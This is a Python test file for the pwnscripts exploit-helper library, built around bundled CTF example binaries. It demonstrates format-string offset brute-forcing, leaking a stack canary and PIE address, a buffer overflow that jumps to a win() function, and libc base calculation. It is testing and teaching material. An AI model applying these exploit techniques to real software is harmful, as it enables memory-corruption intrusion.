'''A number of tests for pwnscripts.
These tests are checked with Github Actions, and should all work on a fresh installation of pwnscripts.

This file also serves to demonstrate some of the features of pwnscripts,
showing off common use-cases and best practices.
'''
#TODO: Figure out why some tests have a small chance of failure.
import unittest as ut
# Unfortunately, pytest interprets every `test.*` function as a testable function, so no import * here
from pwnscripts import system, context, log, fsb, extract_first_hex, fmtstr_payload, is_wsl, extract_all_hex, pack, path, CalledProcessError, libc

class BinTests(ut.TestCase):
    def test_A_common_sense(self):
        # check base necessities
        for i in range(1,3): assert not path.isfile('%d.out'%i)
        assert path.isfile('/usr/bin/gcc')
    
    def test_B_libc(self):
        '''A demonstration of
        1. Error catching for poorly used libc() or libc_database()
        2. common uses of context.libc_database, context.libc
        '''
        print()
        DB_DIR = 'libc-database'
        argumentTests = [
            (ValueError, {'db_dir': DB_DIR}),                           # missing args
            (FileNotFoundError, {'db_dir': DB_DIR, 'id':''}),           # bad ID
            (CalledProcessError, {'db_dir': DB_DIR, 'binary':''}),      # inexistant binary
            (IOError, {'db_dir': '', 'binary':'examples/libc.so.6'}),   # bad libc-db folder
            (ValueError, {'db': DB_DIR, 'binary':'examples/libc.so.6'}),# bad db
        ]
        for err, kwargs in argumentTests:
            self.assertRaises(err, lambda: libc(**kwargs))

        context.libc_database = DB_DIR
        with context.local(log_level='warn'):   # Shut up ELF()
            context.libc = 'examples/libc.so.6'

        lib = context.libc  # Just to shorten (.) usage
        orig_binsh = lib.symbols['str_bin_sh']
        lib.calc_base('scanf', 0x7fffa3b8b040)      # Test this func
        assert lib.address == 0x7fffa3b10000		# Make sure address was set
        assert lib.symbols['str_bin_sh'] == lib.address + orig_binsh	# ELF inherited property
 
    def test_C_printf_buffer_bruteforce(self):
        '''A simple example of fsb.find_offset.
        This behaviour is essentially already implemented in pwntools under FmtStr().'''
        print()
        try:
            system('./examples/1.c')    # compile the program
            context.log_level = 'warn'
            context.binary = '1.out'
            
            @context.quiet
            def printf(l: str): # First, a function to abstract C printf() i/o
                r = context.binary.process()
                r.sendafter('\n', l)
                return r.recvline()
            
            # Let's say we want to write to s[64]. We first find the printf() offset to s[]:
            with context.local(log_level='info'):   # show info for testing purposes
                offset = fsb.find_offset.buffer(printf, maxlen=49)  # maxlen is 50-1 (-1 due to fgets)
            
            # Then, make use of pwntools' fmtstr library to write to there:
            r = context.binary.process()
            s_addr = extract_first_hex(r.recvline())  #another pwnscripts func
            payload = fmtstr_payload(offset, {s_addr+56: 0x12345678}, write_size='short')
            r.sendline(payload)
            
            # Finally, grab back the input (and verify that the flag is there)
            lastline = r.recvall().split(b'\n')[-1]
            r.close()
            self.assertEqual(lastline, b'flag{Goodjob}')    
            
        finally:
            system('rm 1.out')
        
    def test_D_printf_alt_bruteforce(self):
        '''A more complicated use case for fsb.find_offset.
        This uses features that aren't available in pwntools.

        3.c is a simple program that allows for a single printf(), followed by a buffer overflow.
        The program is compiled with both a stack canary and PIE, so we use fsb.find_offset
        to get the positions for a canary leak & a PIE leak, which can then be used for a simple
        buffer overflow to jump to the win() function embedded within the binary.
        '''
        print()
        if is_wsl():
            log.info('Skipping this test due to wsl')
            return
        try:
            system('./examples/3.c')
            # with context.local(log_level='warn'): context.binary = '3.out'
            context.log_level = 'warn'  # Why not use context.local()? Need access to context.binary;
            context.binary = '3.out'    # that isn't available inside a hypothetical with: statement.
            context.log_level = 'info'
            main = context.binary.symbols['main']
            win = context.binary.symbols['win']

            @context.quiet
            def printf(l:str):
                r = context.binary.process()
                r.send(l)
                return r.recvline()

            canary_off = fsb.find_offset.canary(printf) # This part may fail by chance. Investigating why.
            main_off = fsb.find_offset.PIE(printf, main%0x100)
            buffer = fsb.find_offset.buffer(printf, maxlen=63)

            r = context.binary.process()
            r.sendline('%{}$p,%{}$p'.format(canary_off, main_off))
            canary, pie_leak = extract_all_hex(r.recvline())
            payload = b'A'*(canary_off-buffer)*context.bytes
            payload+= pack(canary).ljust(2*context.bytes)   # unfortunate magic number
            r.sendline(payload + pack(pie_leak-main+win))
            self.assertEqual(r.recvline().strip(), b'flag{NiceOne}')
        finally:
            system('rm 3.out')
    # TODO: tests for ROP
if __name__ == '__main__':
    ut.main()
